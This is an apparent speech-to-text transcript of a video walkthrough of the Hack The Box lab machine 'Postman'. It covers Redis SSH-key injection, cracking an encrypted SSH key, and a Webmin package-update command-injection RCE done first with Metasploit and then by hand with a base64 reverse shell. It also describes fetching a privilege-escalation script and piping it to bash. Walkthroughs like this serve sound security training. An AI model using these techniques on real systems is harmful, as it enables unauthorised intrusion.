 what's going on youtube this is ipsec me doing postman from hack the box i'm also going to change things up a little bit and i'd like to keep this change for easy machines and that is record myself doing the box for the very first time of course i know a little bit about postman just based upon all the discord or matamura's chat because this box has been out for like six months but for the most part i haven't really seen anything on this box that being said i record these intros after i've already recorded everything else so i can say once we find the redis server we'll use it to drop an sh key log into the box find a encrypted ssh key and crack it with john and then reuse that password to log into webmin and use a metasploit module to get root on the box and then after that we will just set the metasploit to go through a proxy which is burp and analyze exactly what that module is doing so we can exploit the box without metasploit with all that being said let's just jump in just like every other video i'm going to start off with the nmap sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and it doesn't exist so let's create it put it in the nmap directory and we'll call it purseman and the ip address is 10 1010 160. i'm also going to add a v flag so we can see open ports as nmap finds them we have 22 80 and 10 000 right now i also like doing a nmap p dash to do all ports don't put this in the nmap directory and call this postman dash all ports and the ip address which is 10 10 10 160. since this nmap script hasn't finished yet i'm not going to start this one just wait for the first one to finish because i hate overloading the server but i am going to take a look at port 80 while this is going so going to 10 10 10 160 we do have a page and a potential email address on this so i'm going to copy this and we will put this in cherry tree so interesting and just put that because the potential user of the box same thing down here um i'm going to try index.php doesn't exist html it does so most likely not hosting php or maybe it's just a blank web page we can look at the source code to see if we have any hints so control shift u and i'm pressing that it's not doing that so let's just do web developer where is it maybe it wasn't shift maybe just control you yep just control you so looking at this to see if i can find out what the website is made in doesn't really look like any hints so i'm going to go over to prep suite oh let's intercept this so proxy turn it off there turn it on here refresh the page go in i guess i have to have it here maybe it's not doing it because it's view source there we go so i'm going to turn intercept off i'm going to target tab and just look at the order tree to see where everything is hosted and don't really have anything so i'm gonna go back to my nmap kick off the full port scan and while that goes we can do a go buster so go buster dash u http 10 10 10 160 w user share word list turnbuster directorylist23 medium.txt put it to an out file we'll just call this root go buster dash root dot log and to specify dir mode so there was one more port that was open so let's just take a look at the end map we have 22 it is a ubuntu server so i'm just going to put this over in my interesting thing let's see apache and port 10 000 is running mini serve 1910 so i'm going to look at exploit db so search point mini serve doesn't have anything let's just look at port 10 000. all right wants ssl and we get a hostname week so let's go v etsy hoose 10 10 10 160 first man and go ssl so i just click this link and it loaded um let's look at the certificate oh i was expecting a certificate uh warning because i haven't been here before and i didn't think there would be a signed certificate on the website however i am going through burp i bet if i turn this off and do https 10 10 10 160 port 10 000 whoops 10 000 we get a certificate error if i do first man on 10 000 i also get it so let's take a look at the certificate to see if there's anything else that is leaked uh let's see webmin server and let's just scroll down root at postman root's not really that interesting with name to take note of but nothing interesting there so let's turn bup suite back on and i guess i'll just keep that in mind that maybe burp ignores self-signed certificates try logging with admin admin from previous experience i know webmin probably uses local authentication so not really going to get anywhere here let's go take a look at a go buster so going here oh this is where the nmap is we do have an extra port 6379 but go buster is telling us there's a slash upload directory so let's go to postman upload and we gotta get rid of the s and we have a lot of pictures so is there anything interesting here uh no guessing not i'm just looking at the size to click on ones that stand out we do have a cyber security web banner we can save this image save it in hdb boxes purseman banner.jpg and i need to w get this because if i do firefox it's not going to save the data i want so i can show this by doing ls exif tool banno.jpg and then we will wget the same exact thing and we can put it side by side actually so let's close this and we'll do exif tool banner and exif tool cyber security web banner so we can see firefox squash some of the uh metadata and looking at this we do see a modification date of april 20th 2018. that's not here so this is when the files the image was either created or uploaded to the web server so definitely good to have that date let's just put this here and we can probably validate that that's either when the image was created or uploaded by doing a w get on 10 10 10 160 and doing the same exif tool against index.html and we see 2019 so chances are this is when the cyber security banner was created and then this is going to be index.html created most likely and we can move on so let's look at port 6379 actually we can go back and try like upload.php nothing exists upload.html nothing exists robots.txt nope nothing so let's go now take a look at redis while go busto runs we can do nc 10 10 10 160 and then six three seven nine uh let's do dash v for boost so we know we connected help nothing question mark oh let's see redis let's turn burp suite off because i hate sending all my google searches and stuff to burp suite just in case i want to ever save this i don't want to potentially put some sensitive cookies and things in there just minimize the data um redis upload file read file see if anything's here read a cli um let's see redis print info commands sweet so we have a list of redis commands we got config get info and things like that so if you're on info we can get information there is a redis.com that we may want and nothing too interesting there so we can go back to the command uh config get and now i am remembering this we did this on a previous box i think it was called reddish and um we could upload a file so doing config get star we get a bunch of information but on that box i believe we uploaded a web shell so let's go and google redis upload web shell and going through these i always like going to this book.hacktricks.xyz because it generally puts out good information so we have a nmap script so we can run this to get information it's probably going to get the same exact information we just got but let's try this 10 10 10 160. and let's see apt-get install redis tools and that gives us reddit cli let's see we got the linux version we kind of got that from the apache so it's not too interesting although this does give us the um kernel so we know exactly when the server is updated and let's see you want to paste this in when was this added do we have a date 2000 search 2019 i don't see a date here you can type 2019 here august 2019 which kind of matches up when index.html was created so released around august 2019 so it seems to be an update updated kernel so i'm not gonna try things like shell shock or things like that if i saw the kernel was running from like four years ago of course i tried those order exploits so we got that so we can do write a cli suite that command is now here let's go back here and look info config get keys this is a key last on on the last command so let's do reddit cli h pri for host 10 10 10 160 key stir empty list uh config get star key stir okay i don't know exactly what that's doing i don't want to try automated exploit let's do this manually right cli config set der and we want to do ver www.html uh probably uploads and we'll call this shell.php no such directory for a www.html oh uploads there we go is it upload yep upload config set db redis.php and the reason why i chose upload because generally upload directories you can write to let's do yes and then save error and i think maybe we couldn't write to that directory i'm going to set der www.html and we can do this set test test save error so maybe that's not going to work let's see it wants us to do ssh keys next so we can try that let's do ssh keygen so ssh let's make the keys sh key gen f we'll call this postman don't put a passphrase on it and now we can cat postman.pub get an ssh key it wants us to add two line breaks before and after the thing so i'm just going to man whoops manly do that two line breaks two line breaks okay and then import the file into redis so we can cat it and then pipe so cat first man.pub and we gotta put the correct ip 1010 160. this config it's configured to save rdb snapshots but it's not able to persist on disk it means that modify json i wasn't doing that before write a cli 10 10 10 160 exit okay let's just keep going so keep going so we can do red scli now okay then config set home test.ssh [Music] config set this isn't going to be a directory whoops config set der yeah that's not a directory can we just do configset.sh nope uh let's see redis home directory etsy redis varadis for lib so it looks like it's n var lib let's try var lib redis data ssh set okay uh db file name file name authorized keys save and i guess we don't need gearbuster anymore sagemod 600 postman says shy write us at 10 10 10 160 uh first man accept the key and we did not get in let's see i don't like that one error message we kept getting let's do config getstar do we have the ssh key here at all that's the directory i don't see that's the h directory or that uh key didn't give me an error message that time okay so config set der var lib redis dot ssh config set db file name authorized keys save it worked that time so maybe when i did that web server thing it actually did screw something up and that just fixed itself weird um let's go to ver www.html and let's do find dot dash writable and see if we could have wrote to any directories that is a weird.so file um pwd www.html and we can't write to this directory at all so that's why our upload script didn't work so let's see what should we do go home this dump.rdb is probably from us is it strings yeah nothing interesting there let's go in the home directory lsla we got matt user.txt wc-c see if we can read it we get permission denied ls-la to see if there's anything we can also do fine dot dash readable that was my outlook so i'm gonna pause the video real quick and close chrome okay so nothing too interesting here uh do we have t-mux installed no um screen nope that sucks i like either having like t-mux or screen normally so i can do the team uh this multi-window thing on the server itself but we can just open up ssh keys or estate sessions so we call this postman 10 10 10 160 uh we have to say the reddest user there we go so let's go to copy opt privilege escalation or what is it i thought it was a slow case close escalation awesome sweet blend blendpease and linps.sh do a directory make dirt dub dub dub move it in there and the reason why i do this is because i don't like hosting any files i don't have to let's do python3 http.server and we can curl 10 10 14 2 port 8 000. linps.sh pipe it over to bash um see dev shm i know i could probably do a w get flag that will um go to standard out but i don't know that off the top of my head so i'm just going to download to dex disk and then run it so execute lin p's and while that runs we can look at our other things so let's see we go home well we can look at when matt was on the system and do find slash i want to say dash m time 2019 11 does not equal m time 2019 13 is that how you do that uh let's see fine to file uh find files between two dates and i know m time is the flag i want let's see newer mt newer mt newer mt 1909 one three there we go so two devnoll and it's just listing all the files between those two dates and there's not much 9 15. and we can also add the ls flag which would show why i'm kind of ignoring the dot bash history because i can't read it only matt has read write so let's go over the limpies bash where's the top of this here we go so let's see linux we've looked at it sudo nothing interesting disks only two available software nothing interesting okay processes well we are redis we can't really get to www data so nothing there binary process permissions nothing there cron jobs it's looking pretty standard ip addresses routes ports so we have redis i guess we could potentially poke at the webmin configuration because maybe there's something there if we can pivot to that port so put this in here uh let's do privesque just take notes of things to look at my user pgp keys login ftp oh this is our sync nothing interesting there permit root login set to yes so perhaps we can uh find the root password somewhere and log in because that i don't think is a default thing radius.com set uad files nothing looks unique gid nothing looks unique know what this mtr packet is send receive network probes owned by me wait looking for root files and folders owned by me nothing interesting there it's funny we got a nicto test and a simple hd put server so one of those creds in that i don't know why it's highlighting writable files nothing there nothing so another thing i always like doing is i don't trust a single private trip because prives script i normally run multiple so let's just do cp opt um is it lyndonoom.sh fine slash opt grep dash i landed new sh i guess i don't have it anymore when a new github see january 7th modified relatively recently see the opt get clone citylinum and we'll copy this one over to hp boxes um first man www and python m do htp dot server and w get 10 10 14 2 8 000 lynn noom.sh bash and run this and while that goes let's see if we can find where that um uh what's it called webmin 10 10 10 160 10 000 what is this called webmin so find slash grab i webmin user share to davnol oh i'm piping errors after i did the pipe dev knull let's see two dev shm wetman.log i don't want that squiggly shm and the reason why i did that is so i can do a lot of grabs because i don't want to look at what's in user share i just want to see all the unique things so we'll do grep v to exclude user share on webin i guess i've mistyped it so there's etsy there's attempt.webman so let's look at what this temp dot webmin and webmin setup.out is so cat slash temp dot webmin it's a directory and there's nothing in it what is in this webmin setup.out nothing really there the linear noom script has finished so let's take a look at the very top to go through it quickly let's see we may want to enable thorough tests let's do that uh v linda newm thorough let's see if there is equal to one t-h-o-r 0.2 thorough equals one will that work slash lyndon thorough test enabled awesome so we have a fallback if that doesn't work um weird i wonder if i miss this online ps or we just uh have a difference between the two scripts so let's see login let's just copy that whole line august 26 because if i had that i probably would have changed my find command because i wasn't searching for this date and i probably should look at things he did when he touched the system here so permissions root login [Music] a lot of the things are the same and it's kind of hard sometimes to look over multiple like script checkers because all the data kind of blends in system d timers i don't think that was in the previous one and they all kind of look the same name servers ports udp so webmin actually listens on udp that's interesting running processes binaries it's in it d permissions nothing system deep missions nothing oh god it's a lot of files too much to really look over start apache modules rewrite the following files now set your id picked up the same things still have that mtr packet thing all the files in etsy look standard nothing there actually there is one this was that not in i'm putting this up here to kind of highlight um this is probably the machine creator who made the box doing this so i don't think that was in the uh limpies so bash win peas temp this is just so we can grab it quickly but cd opt lsla idrsa.back trying to get the time lin nope maybe stat idrsa.back the time modified here and paste move it over so logged into the box and about six to seven minutes later he created this backup file so forensics is always good to do even when you're on a pen test because you generally find some pretty cool things so this is a encrypted key so let's ask h over to another box i have i normally don't like doing cracking operations in a vm because in a vm you're limited to the cpu memory etc it's very restricted and cracking is a cpu intensive thing i don't want to do it on my host because well i'm recording this video it may drop frames etc so i always just ssh to a different box on my network um it's just what i like doing let's do v we'll call this postman.ssh and in order to crack keys we have to run a ssh to john and that's in john the ripper if you ever install it it's probably in cali too ls grep ssh sh2 ssh ng.pi and shng to john.pie don't know which one to run um what's this look like v we call it postman s-h-n-g to john i thought there was just like a ssh to john first and sh this looks right i don't know why there's 24 is there so the i guess we can just direct that to a file um first man.john.sh and we'll run john against it and we'll do dash dash word list user share or opt word list roku.txt ls opt wordlet word list rocky.txt and already cracked password is computer 2008 so let's i guess copy this v i go to cd keys v it's probably going to be matt's key because that's one that logged in it's either matt or root so chmod 600 matt sh-i matt 10 10 10 160 uh computer 2008 was the password so matt at so it's not roots key and matt immediately closed the connection so we can get out of this we don't need that cat etsy pass wd matt's got a ben bash so we can probably do who am i that's 1 60 computer 2008 let's do sh login no profile see sh-t try this computer 2008 profile not exactly sure why that's working are not working let's try su-matte computer 2008 there we go so we can ask you we just can't ssh and also it wanted a capital okay so cd etsy ssh i'm kind of curious why chd config is there matt anywhere here deny user okay so that's why that happened but we are matt and we can get user.txt so let's see what can we do with this c.s.h idrsa that's what we have um let's go dev shm dash linps dot sh and run this webmin asked for a login so we can always go back there okay matt computer 2008 we'll try lowercase i just typed it the first time i always try logging in a few times because i am known to typo things so let's see we got system right here software package update so way to execute commands that is something that is normally common with webmin security updates recent logins nothing notifications 32 security updates let's see webmin is version 1.91 let's do search boit webmin so we have a few rces oh we had an unauthenticated rce will this work search point dash x guess should always do this module exploits the back door in eight nine oh only the sourceforge project was backward but still worth a run so msdb run and then we can use this one i know a lot of people don't like using metasploit for whatever reason probably because the oscp denies it but if you don't use something that makes you efficient just because you don't want to be labeled a script kitty or whatever i mean it's kind of a stupid reason not to use something search webmin use the back door one show options and after you get the shell you can always go and look at what matters boy did but it would just suck to waste like 30 40 minutes doing something that you could verify in 15 seconds so that's my thought process behind it set lhost ton zero set that looks good run uh not vulnerable okay so let's do search webmin there was another one see not the back door package upload rce use [Music] and we can set our host and lhost again set user name matt set password computer 2008 run it fail to retrieve session cookie show options 10 10 10 160 set sell true run it says command shell one opened do it who am i nothing happens yet maybe it's just slow and if this doesn't work we'll always just change the payload option there we go so we are now root um cd root lsla holy crap there's a lot of files pwd cd slash root pwd maybe this is in a persistent shell but wc-c root root.text and we could read that file so let's take a look at what metasploit does so we can show advanced options set proxies is equal to http 12701 8080. the easiest way to analyze matasploit on web exploits is just to use burp suite run this uh we gotta set this reverse allow to true run so the first thing it does is log in and we can engagement tools now do intercept responses request you can see it's grabbing the cookie from this then making a post to proc index tree and then this is probably going to be the exploit right here so you let's just send this to decoder smart decode we can copy the temp so uacl apt so this is probably um what the page is doing and then we're appending bash c and this echo command and ok select packages so this looks pretty straightforward to exploit you can notice metasploits replaced all the um spaces with commas so remember if you do echo or we can just do like this echo who am i it auto expands these brackets so i'm not sure if this is needed in the exploit it's just something that metasploit is doing to make it a little bit more reliable we can echo this base64-d to see exactly how metasploit does the shell so let's try doing this manually we can go here drop this because we don't need it turn intercept off system package update and let's see what happens when we click update selected packages is that what it's running click this uh we probably should send this to burp suite package update continue come on doing stats i don't care oh my god i don't care about your stats so package update and essentially it kind of looks similar to what um madisply did so this was acl apt and then did a bunch of things we'll rename this tab msf this was gen updates so mode does this have a mode no but let's try just getting rid of all this sleep five and we will url encode send it's looking promising come on come back now so that does not look like it worked i see oh wait 11 milliseconds let's do sleep dash 15. so if this takes 12 seconds well no we may have something and we can do this one at sleep one to see if this goes quicker but you should be careful when you're doing threading like this because the web application could be coded poorly and um the requests stomp on each other but we got 11 milliseconds back here so that's not that let's see it has this acl percent 2f apt so maybe it needs this to be exploited every time in this page takes around 15 seconds which is annoying and it takes 15 secs to begin with and we're implementing a 15 second sleep so if it takes 30 seconds 21. yeah it's looking better i guess we should just start paying ourselves so we can do ping dash c 10 10 14 2. and c 1 and we can do tcp dump dash i ton 0 dash n and icmp send this and this is probably a better way to do it than sleep assuming we can see the ping packets it sends and we probably should do bash dash c just in case the reason why i hadn't done that is because i assumed it could execute this ping binary and the other thing we should try doing is changing all the pluses to be uh percent 20s so we can try changing this percent well it rewrote it preset 20 i am starting to regret manually stepping through this metasploit exploit without doing any prep because it's not going as smoothly as i expected that's fine let's see what's this look like that's just c ping dash c we probably should put this in quotes so how do they have the quotes percent 22 what does that seven be oh that's the bracket so percent 22. percent 22. run this again all we want to see is a ping back i really thought that one would have worked so one thing you can also do if you want to test if it's this encoding is just encode it like this and see if it works lvmp 444 send if we get a shell back we know it works this way wait sid okay we have this in the cookie so we got the connection back we know it's not how we're encoding so that is good let's see maybe it doesn't actually like the spaces we're doing so let's just try bash c ping dash c 1 10 10 14 2. send ping dash c112701 okay i was making sure dash c was linux and it wasn't dash n so this should work i don't know why it wouldn't oh because we have a plus let's get rid of the pluses and put commas send ping comma we need a comma here that's annoying that looks like it's it do this again and yes so the actual payload doesn't like space as it looks like so if we unroll and curve this whole thing and let's see what does this one look like so we have spaces up here but after this bash dash c we can't so let's do space this bash dash c and then after this we can no longer have spaces comma comma comma okay and we'll see if we get a hit back it could take like i don't know 10 seconds 15 seconds see plus plus page returned didn't get anything back so let's see what is different between our payloads oh squigglies and that was url encoded i think five nope while that loads well now it's loaded still want to get it so let's see how we differ that is literally the same command so it must be something different in [Music] something else if we send this it'll work this one does not so let's see you you okay top let's get rid of this search see mood it's probably this right here this mode cancel send come on one match waiting for the page to come back and then once we get this working we'll take these little squigglies out and put spaces to see if it works because there's no reason why we shouldn't be able to use the space in the payload when we can use spaces here see still not come back fail to connect did we hang it fail to connect i think we may have crashed it yeah it looks like we have crashed webmin so that was unexpected let's verify we can get to the http server we can we just can't get to port ten thousand one two three yep so i'm gonna revert the box and then we'll play with this a little bit more so the box has been reverted so we can log back in matt computer 2008 uh i am going to put this through burp suite because we need to get the new cookie so let's see that should be it 5d b7 it ends in it's definitely a new one so we can paste the new one in and let's see so msf does you acl2f apt you acl2f apt and then you again then and okay this should work send it oh man that came back instantly it did not like something let's just go back to the proxy page manually system software updates and intercept on update selected drop it until we get here we can copy this line on this we can copy this line onto this there we go the last time i copied the cookie for some reason i don't know what happened there send so let's see there must be something else in this header that it did not like but we got the request so we have finally figured out the exploit requires this uacl percent 2f apt but if you wanted to mainly get a show now well actually let's see if we can have spaces okay ctrl u send and while that goes we can try getting a shell so um pen test monkey reverse shell turn burp suite off and that's the command we want and we actually aren't getting a ping back so it looks like maybe there's some merit into you can't use spaces after that dash c thing not sure why that's the case but it's the case so let's do comma 10 10 14 two nine thousand one let's see if we can get a reverse shell this way if this doesn't work then we're gonna probably have to do that base64 encoding that metasploit did nc lvmp 9001 send then we can do echo dash n okay a64 because that is not looking promising so we can do echo dash n paste comma pipe comma base64 comma dash d so that should decode it and then we execute it with bash that is an ugly thing let's url encode everything send and we'll see if we get a hit if we don't get a hit we'll just run this command manually and see where we made an error so let's come back and we didn't get a shell so ctrl shift u to unurl encode it did not work ctrl shift u not sure why that's not working e paste decode oh the base64 has a plus well that's unfortunate how did mesblade deal with that because we can see if this just works real quick uh let's see does not look like that worked oh so what i did here is i base64 encoded the commas and we don't have to if i did that i would have also had to put it in the brackets again so zero add one make sure this works it does oh god where my window go oh that was unfortunate let's decode as base 64. okay that's what i wanted base64 so echo dash n this base64 okay i really don't like those pluses now okay so now we can go back to our command place the base64 string with this one and do the control u thing again to url encode it and we should nc lvmp 9001. see does metasploit i have any pluses percent 20 echo 3d is equal so i can copy up to here echo dash n c percent 2b is that a space a plus decoder yep so you do have pluses it's just encoded to percent to b is that what ours are encoded as yes it is so let's try this command again uh let's see 3d is equal and we know percent to be is plus how is mf doing this so fast c echo pipe okay so it looks like when you do like this bracket expansion you can't use pipes yeah so that's it we just can't use a pipe when we do it this way so that's why sometimes it helps to actually step through the exploit and figure out what it's doing because you learn things there we go and we can send this and we get a shell so we finally figured out how to sand that payload manually so if you wanted to do this now without metasploit you could so hope you guys enjoyed the video take care and i will see you all next week